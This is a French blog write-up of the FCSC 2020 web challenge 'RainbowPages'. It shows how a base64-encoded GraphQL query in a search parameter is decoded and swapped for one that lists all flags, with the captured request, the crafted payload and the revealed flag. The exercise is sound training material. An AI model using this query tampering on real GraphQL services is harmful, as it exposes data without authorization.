---
layout: post
title:  "Writeup - FCSC-2020 - Web - RainbowPages"
date:   2020-05-05 19:00:11 +0200
categories: [writeup]
author: Vixepti
image: /assets/2020/05/FCSC.png
tags: [FCSC, ctf, writeup, web]
---

Writeup sur l'épreuve *RainbowPages* du *France Cybersecurity Challenge 2020*.<!--more-->

# Énoncé
> Nous avons développé une plateforme de recherche de cuisiniers. Venez la tester !

{:refdef: style="text-align: center;"}
![RainbowPages Homepage](/assets/2020/05/rainbowpages-homepage.png)
{: refdef}


# Solution

La page permet donc de chercher des chefs cuisiniers. Je lance une recherche :

{% highlight generic %}
GET /index.php?search=eyBhbGxDb29rcyAoZmlsdGVyOiB7IGZpcnN0bmFtZToge2xpa2U6ICIldGglIn19KSB7IG5vZGVzIHsgZmlyc3RuYW1lLCBsYXN0bmFtZSwgc3BlY2lhbGl0eSwgcHJpY2UgfX19 HTTP/1.1
Host: challenges2.france-cybersecurity-challenge.fr:5006
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.113 Safari/537.36
Accept: */*
Referer: http://challenges2.france-cybersecurity-challenge.fr:5006/
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=a6404b49723f89736210beb430d00106; session=eyJjc3JmX3Rva2VuIjoiMDQ3MzE1YjUzMTBjNGExODAyNmZmMTBkYjUwZTc5NGU1ZDI0MDVlMCJ9.XrEQkA.RHMeWiihOb4wktyg3nzR_e9Exn8
{% endhighlight %}

Je remarque un paramètre *GET* nommé *search* :

> eyBhbGxDb29rcyAoZmlsdGVyOiB7IGZpcnN0bmFtZToge2xpa2U6ICIldGglIn19KSB7IG5vZGVzIHsgZmlyc3RuYW1lLCBsYXN0bmFtZSwgc3BlY2lhbGl0eSwgcHJpY2UgfX19

Décodé depuis la base64 :

> { allCooks (filter: { firstname: {like: "%th%"}}) { nodes { firstname, lastname, speciality, price }}}

On a donc affaire a graphQl, et je peux donc faire mes requêtes dans ce paramètre en base64 :

> { allFlags { nodes { flag }}}

En base64 ça donne :

> eyBhbGxGbGFncyB7IG5vZGVzIHsgZmxhZyB9fX0K

Je lance donc une requête sur : http://challenges2.france-cybersecurity-challenge.fr:5006/?search=eyBhbGxGbGFncyB7IG5vZGVzIHsgZmxhZyB9fX0K

Et j'obtiens comme réponse :

{% highlight json %}
{"data":{"allFlags":{"nodes":[{"flag":"FCSC{1ef3c5c3ac3c56eb178bafea15b07b82c4a0ea8184d76a722337dca108add41a}"}]}}}
{% endhighlight %}

# Flag

Le flag est donc : ***FCSC{1ef3c5c3ac3c56eb178bafea15b07b82c4a0ea8184d76a722337dca108add41a}***